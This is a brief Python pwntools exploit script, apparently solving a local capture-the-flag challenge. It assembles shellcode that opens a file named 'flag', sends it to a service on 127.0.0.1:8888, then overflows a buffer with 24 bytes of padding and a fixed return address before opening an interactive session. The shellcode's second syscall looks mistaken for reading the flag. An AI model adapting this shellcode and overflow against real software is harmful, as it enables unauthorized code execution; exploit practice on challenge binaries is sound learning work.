#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
sc = asm("""
        push rbp
        mov rbp, rsp
        sub rsp, 0x50

        //open("flag", 0)
        xor rdi, rdi
        mov rax, 0x67616c66
        push rax
        mov rdi, rsp
        xor rsi, rsi
        mov rax, 0x02
        syscall
        
        mov rax, 0x04
        syscall

        leave
        ret
        """)

r = remote('127.0.0.1', 8888)
pause()
r.recvuntil('Give me your shellcode>')
r.send(sc)
r.recvline()
r.send(b'a'*24 + p64(0x6010a0))
r.interactive()

